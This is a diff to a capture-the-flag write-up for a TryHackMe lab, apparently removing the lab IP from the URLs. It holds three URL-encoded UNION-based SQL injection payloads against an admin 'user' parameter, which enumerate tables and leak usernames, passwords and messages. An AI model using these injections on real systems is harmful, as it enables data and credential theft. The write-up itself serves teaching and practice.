@@ -137,7 +137,7 @@ This following payload leaks all database names
 ![image14.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image14.png)
 
 We need to target the `marketplace` database. By using this payload we get all the tables in the marketplace database
-http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27;
+`user=1000%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27;`
 
 ![image15.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image15.png)
 
@@ -150,7 +150,7 @@ The `users` table caught my interest so I used this next payload to leak its col
 I tried leaking passwords and I was able to do so with this payload
 
 ```
-http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20username,password,3,4%20FROM%20users%20WHERE%20id=2;
+user=1000%20UNION%20SELECT%20username,password,3,4%20FROM%20users%20WHERE%20id=2;
 ```
 
 ![image17.png](https://raw.githubusercontent.com/BeastieNate5/CTF-Writeups/refs/heads/main/THM/Marketplace/images/image17.png)
@@ -158,7 +158,7 @@ http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20username,password,3,4%20FR
 I then made sure to also look at the messages table to see if any of the other admins had any secret messages they had. Finally I used this payload
 
 ```
-http://10.10.138.5/admin?user=1000%20UNION%20SELECT%20message_content,user_to,5,4%20%20FROM%20messages;
+user=1000%20UNION%20SELECT%20message_content,user_to,5,4%20%20FROM%20messages;
 ```
 
 And this gave me the very first message in the messages table
